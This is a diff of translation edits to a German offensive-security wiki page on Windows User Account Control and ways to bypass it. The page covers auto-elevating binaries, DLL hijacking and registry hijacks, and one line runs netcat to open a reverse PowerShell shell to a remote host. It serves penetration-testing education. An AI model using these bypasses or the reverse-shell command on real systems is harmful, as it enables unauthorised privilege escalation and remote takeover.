@@ -4,7 +4,7 @@
 
 ## UAC
 
-[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Level, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos** ausgeführt, es sei denn, ein Administrator autorisiert diese Anwendungen/Aufgaben ausdrücklich, um Administratorzugriff auf das System zu erhalten. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, jedoch nicht als Sicherheitsgrenze betrachtet wird.
+[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos** ausgeführt, es sei denn, ein Administrator autorisiert diese Anwendungen/Aufgaben ausdrücklich, um Administratorzugriff auf das System zu erhalten. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, jedoch nicht als Sicherheitsgrenze betrachtet wird.
 
 Für weitere Informationen zu Integritätsstufen:
 
@@ -12,9 +12,9 @@ Für weitere Informationen zu Integritätsstufen:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wenn UAC aktiv ist, erhält ein Administratorkonto 2 Tokens: einen Standardbenutzer-Schlüssel, um reguläre Aktionen auf regulärem Niveau auszuführen, und einen mit Administratorrechten.
+Wenn UAC aktiv ist, erhält ein Administratorbenutzer 2 Tokens: einen Standardbenutzerschlüssel, um reguläre Aktionen auf regulärem Niveau auszuführen, und einen mit Administratorrechten.
 
-Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) behandelt, wie UAC im Detail funktioniert und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC spezifisch für ihre Organisation auf lokaler Ebene (unter Verwendung von secpol.msc) funktioniert oder über Gruppenrichtlinienobjekte (GPO) in einer Active Directory-Domänenumgebung konfiguriert und bereitgestellt werden. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich besprochen. Es gibt 10 Gruppenrichtlinieneinstellungen, die für UAC festgelegt werden können. Die folgende Tabelle bietet zusätzliche Details:
+Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) behandelt, wie UAC im Detail funktioniert und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC spezifisch für ihre Organisation auf lokaler Ebene (unter Verwendung von secpol.msc) funktioniert oder über Gruppenrichtlinienobjekte (GPO) in einer Active Directory-Domänenumgebung konfiguriert und bereitgestellt wird. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich besprochen. Es gibt 10 Gruppenrichtlinieneinstellungen, die für UAC festgelegt werden können. Die folgende Tabelle bietet zusätzliche Details:
 
 | Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel     | Standardeinstellung                                          |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ---------------------------------------------------------- |
@@ -31,11 +31,11 @@ Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protect
 
 ### UAC Bypass-Theorie
 
-Einige Programme werden **automatisch erhöht**, wenn der **Benutzer zur** **Administratorgruppe gehört**. Diese Binärdateien haben in ihren _**Manifests**_ die _**autoElevate**_-Option mit dem Wert _**True**_. Die Binärdatei muss auch **von Microsoft signiert** sein.
+Einige Programme werden **automatisch erhöht**, wenn der **Benutzer** zur **Administratorgruppe** gehört. Diese Binärdateien haben in ihren _**Manifests**_ die _**autoElevate**_-Option mit dem Wert _**True**_. Die Binärdatei muss auch **von Microsoft signiert** sein.
 
-Um die **UAC** (von **mittlerem** Integritätslevel **zu hoch**) zu **umgehen**, verwenden einige Angreifer diese Art von Binärdateien, um **beliebigen Code auszuführen**, da er von einem **Prozess mit hohem Integritätslevel** ausgeführt wird.
+Um die **UAC** (von **mittlerer** Integritätsstufe **zu hoher** zu erhöhen) zu **umgehen**, verwenden einige Angreifer diese Art von Binärdateien, um **beliebigen Code auszuführen**, da er von einem **Prozess mit hoher Integritätsstufe** ausgeführt wird.
 
-Sie können das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals **überprüfen**. Und Sie können den **Integritätslevel** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) **sehen**.
+Sie können das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals **überprüfen**. Und Sie können die **Integritätsstufe** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) **sehen**.
 
 ### UAC überprüfen
 
@@ -66,7 +66,7 @@ Dann müssen Sie den Wert von **`LocalAccountTokenFilterPolicy`** überprüfen\
 Wenn der Wert **`0`** ist, kann nur der **RID 500** Benutzer (**eingebauter Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn er `1` ist, können **alle Konten in der Gruppe "Administratoren"** dies tun.
 
 Und schließlich überprüfen Sie den Wert des Schlüssels **`FilterAdministratorToken`**\
-Wenn **`0`** (Standard), kann das **eingebaute Administratorkonto** Remote-Administrationsaufgaben durchführen, und wenn **`1`**, kann das eingebaute Administratorkonto **keine** Remote-Administrationsaufgaben durchführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.
+Wenn **`0`** (Standard), kann das **eingebaute Administratorkonto** Remote-Administrationsaufgaben durchführen, und wenn **`1`**, kann das eingebaute Administratorkonto **nicht** Remote-Administrationsaufgaben durchführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.
 
 #### Zusammenfassung
 
@@ -106,7 +106,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **Sehr** grundlegende UAC "Umgehung" (voller Zugriff auf das Dateisystem)
 
-Wenn Sie eine Shell mit einem Benutzer haben, der zur Gruppe der Administratoren gehört, können Sie **das C$**-Freigabe über SMB (Dateisystem) lokal auf einem neuen Laufwerk einbinden und Sie haben **Zugriff auf alles im Dateisystem** (sogar auf den Administrator-Hauptordner).
+Wenn Sie eine Shell mit einem Benutzer haben, der in der Gruppe der Administratoren ist, können Sie **das C$**-Freigabe über SMB (Dateisystem) lokal auf einem neuen Laufwerk einbinden und Sie haben **Zugriff auf alles im Dateisystem** (sogar auf den Administrator-Hauptordner).
 
 > [!WARNING]
 > **Es scheint, dass dieser Trick nicht mehr funktioniert**
@@ -150,7 +150,7 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Auch auf [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite erhalten Sie die Windows-Version `1607` aus den Build-Versionen.
+Auch auf der [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite erhalten Sie die Windows-Version `1607` aus den Build-Versionen.
 
 #### Weitere UAC-Umgehungen
 
@@ -166,7 +166,7 @@ Sie können eine **meterpreter**-Sitzung verwenden. Migrieren Sie zu einem **Pro
 
 Wenn Sie Zugriff auf eine **GUI haben, können Sie einfach die UAC-Aufforderung akzeptieren**, wenn Sie sie erhalten, Sie benötigen wirklich keine Umgehung. Der Zugriff auf eine GUI ermöglicht es Ihnen, die UAC zu umgehen.
 
-Darüber hinaus, wenn Sie eine GUI-Sitzung erhalten, die jemand verwendet hat (potenziell über RDP), gibt es **einige Tools, die als Administrator ausgeführt werden**, von wo aus Sie beispielsweise **cmd** direkt **als Admin** ausführen können, ohne erneut von UAC aufgefordert zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **stealthy** sein.
+Darüber hinaus, wenn Sie eine GUI-Sitzung erhalten, die jemand verwendet hat (möglicherweise über RDP), gibt es **einige Tools, die als Administrator ausgeführt werden**, von denen aus Sie **cmd** beispielsweise **als Admin** direkt ausführen können, ohne erneut von UAC aufgefordert zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **stealthy** sein.
 
 ### Lauter Brute-Force-UAC-Umgehung
 
@@ -176,7 +176,7 @@ Wenn es Ihnen nichts ausmacht, laut zu sein, könnten Sie immer **etwas wie** [*
 
 Wenn Sie sich **UACME** ansehen, werden Sie feststellen, dass **die meisten UAC-Umgehungen eine Dll Hijacking-Sicherheitsanfälligkeit ausnutzen** (hauptsächlich das Schreiben der bösartigen dll in _C:\Windows\System32_). [Lesen Sie dies, um zu lernen, wie man eine Dll Hijacking-Sicherheitsanfälligkeit findet](../windows-local-privilege-escalation/dll-hijacking.md).
 
-1. Finden Sie eine Binärdatei, die **autoelevate** (prüfen Sie, ob sie beim Ausführen auf einem hohen Integritätslevel läuft).
+1. Finden Sie eine Binärdatei, die **autoelevate** (prüfen Sie, dass sie beim Ausführen auf einem hohen Integritätslevel läuft).
 2. Verwenden Sie procmon, um "**NAME NOT FOUND**"-Ereignisse zu finden, die anfällig für **DLL Hijacking** sein können.
 3. Sie müssen wahrscheinlich die DLL in einige **geschützte Pfade** (wie C:\Windows\System32) schreiben, in denen Sie keine Schreibberechtigungen haben. Sie können dies umgehen, indem Sie:
    1. **wusa.exe**: Windows 7, 8 und 8.1. Es ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (da dieses Tool von einem hohen Integritätslevel ausgeführt wird).
@@ -185,6 +185,6 @@ Wenn Sie sich **UACME** ansehen, werden Sie feststellen, dass **die meisten UAC-
 
 ### Eine weitere UAC-Umgehungstechnik
 
-Besteht darin zu beobachten, ob eine **autoElevated Binärdatei** versucht, aus der **Registry** den **Namen/Pfad** einer **Binärdatei** oder **Befehls** zu **lesen**, die **ausgeführt** werden soll (dies ist interessanter, wenn die Binärdatei diese Informationen innerhalb des **HKCU** sucht).
+Besteht darin zu beobachten, ob eine **autoElevated-Binärdatei** versucht, aus der **Registrierung** den **Namen/Pfad** einer **Binärdatei** oder **Befehls** zu **lesen**, die **ausgeführt** werden soll (dies ist interessanter, wenn die Binärdatei diese Informationen innerhalb des **HKCU** sucht).
 
 {{#include ../../banners/hacktricks-training.md}}
